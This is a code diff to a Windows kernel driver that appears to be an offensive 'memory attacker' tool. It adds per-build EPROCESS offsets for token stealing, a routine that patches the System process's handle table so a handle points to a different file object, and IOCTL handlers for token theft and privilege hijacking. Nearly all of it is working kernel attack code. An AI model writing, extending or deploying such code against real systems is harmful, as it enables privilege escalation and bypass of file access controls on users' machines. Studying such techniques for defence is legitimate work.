@@ -161,12 +161,6 @@ _Use_decl_annotations_ static void read_param(IN PIRP pIrp,
 
 //////////////////////////////////////////////////////////////////////////
 
-typedef struct _EPROC_OFFSETS {
-	int UniqueProcessId;
-	int ActiveProcessLinks;
-	int Token;
-}EPROC_OFFSETS, *PEPROC_OFFSETS;
-
 EPROC_OFFSETS g_EprocOffsets = { 0 }; 
 
 NTSTATUS init_global_vars() {
@@ -189,12 +183,27 @@ NTSTATUS init_global_vars() {
 		nt_status = STATUS_SUCCESS;
 		break;
 	case 14393: /* Win10_1607_SingleLang_English_x64 */
-		/* BUILDOSVER_STR:  10.0.14393.0.amd64fre.rs1_release.160715-1616 */
+		/*  BUILDOSVER_STR:  10.0.14393.0.amd64fre.rs1_release.160715-1616  */
 		g_EprocOffsets.UniqueProcessId = 0x2e8;
 		g_EprocOffsets.ActiveProcessLinks = 0x2f0;
 		g_EprocOffsets.Token = 0x358;
 		nt_status = STATUS_SUCCESS;
 		break;
+	case 18362:	/*   Windows 10 Kernel Version 18362 MP (1 procs) Free x64 */
+		/*   BUILDOSVER_STR:  10.0.18362.1.amd64fre.19h1_release.190318-1202   */
+		g_EprocOffsets.UniqueProcessId = 0x2e8;
+		g_EprocOffsets.ActiveProcessLinks = 0x2f0;
+		g_EprocOffsets.Token = 0x360;
+		nt_status = STATUS_SUCCESS;
+		break;
+	case 17763:	/*   Windows 10 Win10_1809Oct_v2_English_x64 */
+				/*   BUILDOSVER_STR:  10.0.17763.1.amd64fre.rs5_release.180914-1434   */
+		g_EprocOffsets.UniqueProcessId = 0x2e0;
+		g_EprocOffsets.ActiveProcessLinks = 0x2e8;
+		g_EprocOffsets.Token = 0x358;
+		nt_status = STATUS_SUCCESS;
+		break;
+
 	default:
 		g_EprocOffsets = { 0 };
 		nt_status = STATUS_UNSUCCESSFUL;
@@ -304,6 +313,154 @@ bool copy_fileobj_fields(FILE_OBJECT * src, FILE_OBJECT * dst) {
 	return b_res;
 }
 
+const int g_ObjectPointerBitsOffset = (OBJECTPOINTERBITS_OFFSET);
+const int  g_ObjectPointerBitsSz = (OBJECTPOINTERBITS_SIZE);
+//char g_ObjectPointerBits[g_ObjectPointerBitsSz] = { 0 };
+
+#define EX_ADDITIONAL_INFO_SIGNATURE (ULONG_PTR)(-2)
+
+#define ExpIsValidObjectEntry(Entry) \
+    ( (Entry != NULL) && (Entry->LowValue != 0) && (Entry->HighValue != EX_ADDITIONAL_INFO_SIGNATURE) )
+
+/*
+1.247 InterlockedExchangeAdd
+The InterlockExchangeAdd function performs an atomic addition of an increment value to an addend variable. The
+function prevents more than one thread from using the same variable simultaneously.
+
+Remarks
+The functions InterlockedExchangeAdd, InterlockedCompareExchange, InterlockedDecrement, 
+InterlockedExchange, and InterlockedIncrement provide a simple mechanism for synchronizing access to a
+variable that is shared by multiple threads. The threads of different processes can use this mechanism if the variable is
+in shared memory.
+The InterlockedExchangeAdd function performs an atomic addition of the Increment value to the value pointed to
+by Addend. The result is stored in the address specified by Addend. The initial value of the variable pointed to by
+Addend is returned as the function value.
+The variables for InterlockedExchangeAdd must be aligned on a 32-bit boundary; otherwise, this function will fail
+on multiprocessor x86 systems and any non-x86 systems.
+*/
+
+/* Implement _InterlockedExchangeAdd8 in terms of _InterlockedCompareExchange8 */
+// static __inline char
+// _InterlockedExchangeAdd8(char volatile *Addend, char Value)
+// {
+// 	char Initial = *Addend;
+// 	char Comparand;
+// 	do {
+// 		char Exchange = Initial + Value;
+// 		Comparand = Initial;
+// 		Initial = _InterlockedCompareExchange8(Addend, Exchange, Comparand);
+// 	} while (Initial != Comparand);
+// 	return Comparand;
+// }
+//
+// lock inc byte ptr [rax] ds:002b:ffff8a80`09c67c20=fe
+//
+
+VOID
+ExUnlockHandleTableEntry(
+	__inout PHANDLE_TABLE HandleTable,
+	__inout PHANDLE_TABLE_ENTRY HandleTableEntry
+) {
+	// Release implicit locks, the function ExUnlockHandleTableEntry() - is unresolved 
+	_InterlockedExchangeAdd8((char*)&HandleTableEntry->VolatileLowValue, 1);  // Set Unlocked flag to 1
+	if (HandleTable != NULL && HandleTable->HandleContentionEvent)
+		ExfUnblockPushLock(&HandleTable->HandleContentionEvent, NULL);
+}
+
+typedef struct _HandleTableHijacker{
+	HANDLE hijackerHandle;
+	void * targetFileObjectHeader;
+}HandleTableHijacker, *PHandleTableHijacker;
+
+/// <summary>
+/// Handle enumeration callback
+/// </summary>
+/// <param name="HandleTable">Process handle table</param>
+/// <param name="HandleTableEntry">Handle entry</param>
+/// <param name="Handle">Handle value</param>
+/// <param name="EnumParameter">User context</param>
+/// <returns>TRUE when desired handle is found</returns>
+BOOLEAN walkthrough_handle_table_and_patch(
+	IN PHANDLE_TABLE HandleTable,
+	IN PHANDLE_TABLE_ENTRY HandleTableEntry,
+	IN HANDLE Handle,
+	IN PVOID EnumParameter
+) {
+	UNREFERENCED_PARAMETER(HandleTable);
+	BOOLEAN result = FALSE;
+	if (HandleTableEntry){
+		if (EnumParameter != NULL) {
+			PHandleTableHijacker hijacker_param = (PHandleTableHijacker)EnumParameter;
+			if (Handle == hijacker_param->hijackerHandle) {
+				if (ExpIsValidObjectEntry(HandleTableEntry)) {
+					DbgPrint("The hijacker handle table entry is found.\r\n");
+					DbgPrint("Checking handle table entry..\r\n");
+					
+					char *addr = ((char*)HandleTableEntry + g_ObjectPointerBitsOffset);
+					int zeros = 0;
+					// check hijacked handle table entry 
+					for (int i = 0; i < g_ObjectPointerBitsSz; i++) {
+						if (addr[i] == 0)   {
+							zeros++;
+						}
+					}
+					if (zeros != g_ObjectPointerBitsSz){
+						// change the hijacked handle table entry to the target object header
+						DbgPrint("Patching handle table entry..\r\n");
+						for (int i = 0; i < g_ObjectPointerBitsSz; i++) {
+							addr[i] = ((char*)&hijacker_param->targetFileObjectHeader)[i];
+						}
+						result = TRUE;
+					}
+				}
+				
+			}
+		}
+	}
+	
+	//ExUnlockHandleTableEntry(HandleTable, HandleTableEntry);
+
+	// Release implicit locks
+	_InterlockedExchangeAdd8((char*)&HandleTableEntry->VolatileLowValue, 1);  // Set Unlocked flag to 1
+	if (HandleTable != NULL && HandleTable->HandleContentionEvent)
+		ExfUnblockPushLock(&HandleTable->HandleContentionEvent, NULL);
+	return result;
+}
+
+bool get_object_header_by_handle(HANDLE targetFileHandle, void* & targetObjectHeader) {
+	PFILE_OBJECT targetFileObject = NULL;
+	NTSTATUS nt_status = ObReferenceObjectByHandle(targetFileHandle, FILE_ALL_ACCESS,
+		*IoFileObjectType, KernelMode, (PVOID *)&targetFileObject, NULL);
+	if (NT_SUCCESS(nt_status)) {
+		targetObjectHeader = (void*)((char*)targetFileObject - 0x30);
+		DbgPrint("The target OBJECT_HEADER is here [%I64X].\r\n", targetObjectHeader);
+		if (targetFileObject) { ObDereferenceObject(targetFileObject); }
+	}
+	return NT_SUCCESS(nt_status);
+}
+
+bool hijack_handle_table(HANDLE hijackerHandle, void* targetObjectHeader) {
+	bool b_res = false;
+	const HANDLE system_pid = (HANDLE)4;
+	PEPROCESS system_eprocess = NULL;
+	if (NT_SUCCESS(PsLookupProcessByProcessId(system_pid, &system_eprocess))) {
+		DbgPrint("Looking for the handle table entry..\r\n");
+
+		PHANDLE_TABLE pTable = *(PHANDLE_TABLE*)((char*)system_eprocess + 0x418 /*dynData.ObjTable*/);
+		HandleTableHijacker table_hijacker = { 0 };
+		table_hijacker.hijackerHandle = (ObKernelHandleToHandle(hijackerHandle)); //hijackerHandle = ObMarkHandleAsKernelHandle(hijackerHandle);
+		table_hijacker.targetFileObjectHeader = targetObjectHeader;
+		if (TRUE == ExEnumHandleTable(pTable, &walkthrough_handle_table_and_patch, &table_hijacker, NULL)) {
+			b_res = true;
+			DbgPrint("+ hijacking success! \r\n");
+		}
+		else { DbgPrint("- hijacking failed! \r\n"); }
+
+		if (system_eprocess) { ObDereferenceObject(system_eprocess); }
+	}
+	return b_res;
+}
+
 // IOCTL dispatch handler
 _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
 	UNREFERENCED_PARAMETER(pDeviceObject);
@@ -318,7 +475,7 @@ _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pD
 	read_param(pIrp, in_buf, in_buf_sz, out_buf, out_buf_sz);
 	switch (stack->Parameters.DeviceIoControl.IoControlCode)
 	{
-	case MEM_ATTACKER_SET_PRIVS:
+	case MEM_ATTACKER_TOKEN_STEALING:
 		if (in_buf_sz == sizeof ULONG64) {
 			ULONG64 pid = 0;
 			ULONG64* pdata = (ULONG64*)in_buf;
@@ -416,7 +573,7 @@ _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pD
 		break;
 	}
 
-	case MEM_ATTACKER_OPEN_BY_HIJACKING:
+	case MEM_ATTACKER_OPEN_BY_HIJACKING_FILEOBJ:
 		// 1. Create and open a tmp-file
 		zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf);
 		if (in_buf_sz == sizeof OPEN_THE_FILE) {
@@ -437,6 +594,28 @@ _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pD
 		}
 		break;
 
+	case MEM_ATTACKER_OPEN_BY_HIJACKING_FILEHANDLE:
+		if (in_buf_sz == sizeof HIJACKING_HANDLE_TABLE) {
+			// 1. Create and open a tmp-file
+			PHIJACKING_HANDLE_TABLE file = (PHIJACKING_HANDLE_TABLE)in_buf;
+			if (zwfile::zw_open_file(fw_open_file, sizeof file->file_hijacker, &file->file_hijacker)) {
+				void* target_file_object_header = NULL;
+				if (get_object_header_by_handle(file->target_file_handle, target_file_object_header) && 
+					hijack_handle_table(file->file_hijacker.handle, target_file_object_header)) {
+					file->file_hijacker.is_hijacking_ok = true;
+				}
+			}
+		}
+		break;
+	case MEM_ATTACKER_HIJACK_PRIVS:
+		if (in_buf_sz == sizeof HIJACK_PRIVS_DATA){
+			PHIJACK_PRIVS_DATA p_data = (PHIJACK_PRIVS_DATA)in_buf;
+			if (p_data && p_data->processID){
+				p_data->is_privs_hijacking_ok =					
+					token_hijacking::hijacking(p_data->processID);
+			}
+		}
+		break;
 
 	//////////////////////////////////////////////////////////////////////////
 	case MEM_ATTACKER_WRITE_8_BYTES:
